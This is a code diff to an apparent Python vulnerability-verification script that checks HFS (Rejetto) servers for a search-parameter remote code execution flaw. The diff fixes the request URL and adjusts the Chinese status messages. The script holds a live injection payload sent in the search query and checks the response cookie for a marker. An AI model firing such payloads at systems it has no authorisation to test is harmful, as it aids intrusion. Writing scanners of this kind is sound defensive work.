@@ -25,17 +25,17 @@ class hfs_rejetto_search_rce_BaseVerify:
             sess = requests.Session()
             sess.get(vulnurl, headers=headers, timeout=10, verify=False)
             checkurl = self.url + "/?search==%00{.cookie|out|value={.load|res.}.}"
-            req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
+            req = sess.get(checkurl, headers=headers, timeout=10, verify=False)
             check_cookie = req.headers.get("set-cookie")
             if check_cookie is None:
                 pass
             elif r"123456test" in check_cookie:
                 cprint("[+]存在hfs rejetto 远程代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")
             else:
-                pass
+                cprint("[-]不存在hfs_rejetto_search_rce漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
